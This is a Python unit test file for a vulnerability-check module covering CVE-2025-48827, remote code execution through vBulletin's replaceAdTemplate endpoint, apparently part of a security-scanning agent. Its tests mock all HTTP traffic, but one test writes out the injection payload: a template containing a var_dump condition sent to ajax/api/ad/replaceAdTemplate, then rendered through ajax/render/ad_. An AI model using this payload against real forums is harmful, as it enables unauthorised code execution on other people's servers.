"""Unit tests for CVE-2025-48827"""

from unittest import mock

from requests import exceptions as requests_exceptions

from agent import definitions
from agent.exploits import cve_2025_48827


# --- Helper Functions ---


def create_mock_response(status_code: int, text: str = "") -> mock.MagicMock:
    """Create a mock HTTP response."""
    response = mock.MagicMock()
    response.status_code = status_code
    response.text = text
    return response


# --- Tests for accept() ---


def testAccept_whenVbulletinDetected_shouldReturnTrue() -> None:
    """Test accept() returns True when vBulletin indicators are found."""
    target = definitions.Target(scheme="http", host="example.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    # Mock response with vBulletin indicators
    vbulletin_html = '<meta content="vBulletin 5.6.4" name="generator" /><script src="vbulletin-core.js"></script>'
    mock_session = mock.MagicMock()
    mock_session.get.return_value = create_mock_response(200, vbulletin_html)
    exploit.session = mock_session

    result = exploit.accept(target)

    assert result is True
    mock_session.get.assert_called_once_with(
        "http://example.com:80", timeout=15.0, allow_redirects=True
    )


def testAccept_whenNoVbulletinIndicators_shouldReturnFalse() -> None:
    """Test accept() returns False when no vBulletin indicators are found."""
    target = definitions.Target(scheme="https", host="example.com", port=443)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    generic_html = (
        "<html><head><title>Generic Site</title></head><body>Hello World</body></html>"
    )
    mock_session = mock.MagicMock()
    mock_session.get.return_value = create_mock_response(200, generic_html)
    exploit.session = mock_session

    result = exploit.accept(target)

    assert result is False


def testAccept_whenRequestFails_shouldReturnFalse() -> None:
    """Test accept() returns False when HTTP request fails."""
    target = definitions.Target(scheme="http", host="unreachable.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_session = mock.MagicMock()
    mock_session.get.side_effect = requests_exceptions.ConnectionError(
        "Connection failed"
    )
    exploit.session = mock_session

    result = exploit.accept(target)

    assert result is False


def testAccept_whenTimeout_shouldReturnFalse() -> None:
    """Test accept() returns False when request times out."""
    target = definitions.Target(scheme="http", host="slow.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_session = mock.MagicMock()
    mock_session.get.side_effect = requests_exceptions.Timeout("Request timed out")
    exploit.session = mock_session

    result = exploit.accept(target)

    assert result is False


def testAccept_when404_shouldReturnFalse() -> None:
    """Test accept() returns False when server returns 404."""
    target = definitions.Target(scheme="http", host="example.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_session = mock.MagicMock()
    mock_session.get.return_value = create_mock_response(404, "Not Found")
    exploit.session = mock_session

    result = exploit.accept(target)

    assert result is False


# --- Tests for check() ---


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenPocFoundInInjectResponse_shouldReportVuln(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() reports vulnerability when PoC output found in inject response."""
    target = definitions.Target(scheme="http", host="vulnerable.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["abc12345", "testval8"]

    poc_output = 'string(8) "testval8"'
    mock_session = mock.MagicMock()
    mock_session.post.return_value = create_mock_response(200, poc_output)
    exploit.session = mock_session

    expected_vuln = mock.MagicMock()

    with mock.patch.object(
        exploit, "create_vulnerability", return_value=expected_vuln
    ) as mock_create:
        vulnerabilities = exploit.check(target)

        assert len(vulnerabilities) == 1
        assert vulnerabilities[0] == expected_vuln
        mock_create.assert_called_once_with(target=target)

    assert mock_session.post.call_count == 1


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenPocFoundInRenderResponse_shouldReportVuln(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() reports vulnerability when PoC output found in render response."""
    target = definitions.Target(scheme="http", host="vulnerable.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["loc12345", "val87654"]

    inject_response = create_mock_response(200, "Template injected successfully")
    render_response = create_mock_response(200, 'Debug: string(8) "val87654" in output')
    mock_session = mock.MagicMock()
    mock_session.post.side_effect = [inject_response, render_response]
    exploit.session = mock_session

    expected_vuln = mock.MagicMock()

    with mock.patch.object(exploit, "create_vulnerability", return_value=expected_vuln):
        vulnerabilities = exploit.check(target)

    assert len(vulnerabilities) == 1
    assert vulnerabilities[0] == expected_vuln
    assert mock_session.post.call_count == 2


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenInjectFails_shouldReturnEmpty(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() returns empty list when inject request fails."""
    target = definitions.Target(scheme="http", host="secure.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["rand1234", "test5678"]
    mock_session = mock.MagicMock()
    mock_session.post.return_value = create_mock_response(403, "Forbidden")
    exploit.session = mock_session

    vulnerabilities = exploit.check(target)

    assert len(vulnerabilities) == 0
    assert mock_session.post.call_count == 1


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenNoPocOutput_shouldReturnEmpty(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() returns empty list when no PoC output is found."""
    target = definitions.Target(scheme="http", host="patched.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["test1234", "value567"]

    inject_response = create_mock_response(200, "Template processed")
    render_response = create_mock_response(200, "Ad rendered successfully")
    mock_session = mock.MagicMock()
    mock_session.post.side_effect = [inject_response, render_response]
    exploit.session = mock_session

    vulnerabilities = exploit.check(target)

    assert len(vulnerabilities) == 0
    assert mock_session.post.call_count == 2


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenConnectionError_shouldReturnEmpty(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() handles connection errors gracefully."""
    target = definitions.Target(scheme="http", host="down.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["rand1234", "test5678"]
    mock_session = mock.MagicMock()
    mock_session.post.side_effect = requests_exceptions.ConnectionError(
        "Connection failed"
    )
    exploit.session = mock_session

    vulnerabilities = exploit.check(target)

    assert len(vulnerabilities) == 0


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenTimeout_shouldReturnEmpty(mock_random: mock.MagicMock) -> None:
    """Test check() handles timeouts gracefully."""
    target = definitions.Target(scheme="http", host="slow.com", port=80)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["rand1234", "test5678"]
    mock_session = mock.MagicMock()
    mock_session.post.side_effect = requests_exceptions.Timeout("Request timed out")
    exploit.session = mock_session

    vulnerabilities = exploit.check(target)

    assert len(vulnerabilities) == 0


@mock.patch("agent.exploits.cve_2025_48827._generate_random_alnum")
def testCheck_whenPayloadSent_shouldContainExpectedStructure(
    mock_random: mock.MagicMock,
) -> None:
    """Test check() sends correctly structured payloads."""
    target = definitions.Target(scheme="https", host="test.com", port=443)
    exploit = cve_2025_48827.VbulletinReplaceAdRceExploit()

    mock_random.side_effect = ["loc98765", "val12345"]
    mock_session = mock.MagicMock()
    mock_session.post.return_value = create_mock_response(200, "No PoC output")
    exploit.session = mock_session

    exploit.check(target)

    inject_call = mock_session.post.call_args_list[0]
    inject_data = inject_call[1]["data"]

    assert inject_data["routestring"] == "ajax/api/ad/replaceAdTemplate"
    assert inject_data["styleid"] == "1"
    assert inject_data["location"] == "loc98765"
    assert (
        "<vb:if condition='var_dump(\\\"val12345\\\")'></vb:if>"
        in inject_data["template"]
    )

    render_call = mock_session.post.call_args_list[1]
    render_data = render_call[1]["data"]

    assert render_data["routestring"] == "ajax/render/ad_loc98765"
